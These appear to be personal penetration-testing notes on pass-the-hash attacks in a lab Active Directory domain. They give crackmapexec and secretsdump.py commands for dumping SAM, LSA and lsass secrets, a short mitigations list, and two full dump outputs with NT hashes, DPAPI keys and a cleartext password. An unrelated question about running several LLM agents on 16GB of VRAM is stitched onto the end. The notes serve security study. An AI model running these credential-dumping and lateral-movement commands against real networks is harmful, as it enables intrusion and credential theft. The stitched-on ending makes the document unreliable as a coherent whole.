
## Quick-Use

**Commands**:
- crackmapexec:
    - for pw: `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p <pass>`
    - for hash: 
        - passing hash generic - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`
        - pass hash and dump SAM data - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam` 
        - pass hash and dump shares - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --shares`
        - pass hash and dump Local Security Authority - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --lsa`
        - pass hash and dump lsass with lsassy - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy` (-M is short for module, and `lsassy` is only one of many modules)
    - `crackmapexec` also has a db containing enum data gathered so far, called `cmedb`
- secretsdump -
    - with password: `secretsdump.py ADDOMAINNAME/uname:UserPasswd@TARGIPADDR`
    - with hash: `secretsdump.py uname:@TARGIPADDR -hashes LM:NT`
 

*Tools*:
- `crackmapexec` - Passes the password or the hash, and also gives a readout of what has been pwned (what has been logged into that is a local admin)
- `secretsdump.py`  - grabs local hashes, see [[Pass the hash#Examples|Examples]] for usage
    - For `secretsdump`, you Especially want to pay attention to local admin hashes you get, and ESPECIALLY domain admin hashes
        - you will also want to dump secrets from every machine you have access to as a local admin
    - `msf> exploit(windows/smb/psexec)` is an alternative if you would like to use `Metasploit`

## General

**Objectives**:
If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks


## Mitigations

it's all basically best practice items:
- limit account reuse
    - avoid re-using local admin password
    - disable guest and admin accounts
    - limit who is a local administrator (principle of least privilege)
- utilize strong passwords
    - the longer the better (>14 characters)
    - avoid using common words
    - try using long sentences with punctuation
- Privilege Access Management
    - checkin/checkout sensitive accounts when needed
    - automatically rotate passwords on check out and check in
    - limits pass attacks as hash/password is strong and constantly rotated

## Examples

`secretsdump.py`

### Example 1: Local administrator hash acquired on their machine

*things of note*:
- note the administrator user you obtained in the below example

```python
┌──(l1ch㉿kali)-[~]
└─$ secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.109.138 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x861406d43ae908cc3e4a07b2c5fb6a51
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:12b5c0b380a9e97a63f74c8bec27d8f2:::
frankcastle:1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:77139fda37bded76183ea5437587deaaea3a83dcb29c65c01a1991476582a4ee
MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:2246ed01690c0963ba36c498f6687bdc
MARVEL\THEPUNISHER$:des-cbc-md5:8397f257abb60ea8
MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:8e88a9f9565858e39310332ded567cff:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xceaa78f3bc555061c2055ab8161da9df3e947eb9
dpapi_userkey:0x8baf7927d6e1bf035138882a159dba3104689217
[*] NL$KM 
 0000   E0 65 4B 72 22 6D 56 DE  90 88 48 EC 9C FB F0 49   .eKr"mV...H....I
 0010   15 4D E0 83 C2 51 CE 5B  D4 58 3C E9 5B 1A 21 12   .M...Q.[.X<.[.!.
 0020   DD AD EA D2 48 89 5F D8  B8 D8 E0 91 F6 D6 1D 44   ....H._........D
 0030   61 6F A1 13 1F 9E 0B 10  E6 4D 23 25 A1 11 00 A4   ao.......M#%....
NL$KM:e0654b72226d56de908848ec9cfbf049154de083c251ce5bd4583ce95b1a2112ddadead248895fd8b8d8e091f6d61d44616fa1131f9e0b10e64d2325a11100a4
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
                                                                            
┌──(l1ch㉿kali)-[~]
└─$     

```

### Example 2: Local administrator hash on a different user's machine:


*Things of note*:

You obtained a different user's hash as well, since the user used in this example was an admin for the machine's user

```python
┌──(l1ch㉿kali)-[~]
└─$ secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.109.139
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa21ce64d298b50aabae6fc50aba9a094
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0780675b98cc3fd2989c1ad67dbcd798:::
peterparker:1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:5fca53b05311cfdf983ec78168163938e1fb61d6aa9891124924fe5078374cf1
MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:f4aea8b00b486a7af78662237f024447
MARVEL\SPIDERMAN$:des-cbc-md5:f73e13347cc845f1
MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:7c92e7998ecc719dc3251a0a4b31b57f:::
[*] DefaultPassword 
peterparker:Password1
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf6490e2def90acc4f88a3437f7442fc223722f86
dpapi_userkey:0xbd39f0ec7b1c571d3ebc5713875b610c4a97d52b
[*] NL$KM 
 0000   67 66 01 0A 9E 7C C5 BA  BC 5C F2 B1 D9 20 06 17   gf...|...\... ..
 0010   84 4A 94 FA 56 2D 8C 71  EE CA EC 33 B2 A6 89 BB   .J..V-.q...3....
 0020   9B D2 15 BA FE CF 7F 49  32 16 28 53 78 1A 00 88   .......I2.(Sx...
 0030   DF 79 06 80 0C 23 B6 3F  A9 B7 17 DF 35 DF 0F 5B   .y...#.?....5..[
NL$KM:6766010a9e7cc5babc5cf2b1d9200617844a94fa562d8c71eecaec33b2a689bb9bd215bafecf7f4932162853781a0088df7906800c23b63fa9b717df35df0f5b
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
                                                                            
┌──(l1ch㉿kali)-[~]
└─$ 

```



I have 16gb of vram. If i wanted to run at least 6 agents concurrently, at a decent size for general inferrence, say at least 2B or higher, how many agents can I run? what would be a decent optimal count if I wanted multiple agents to provide a response, deliberate on their proposals, debate them, and then vote on the best proposal and present me with the response? 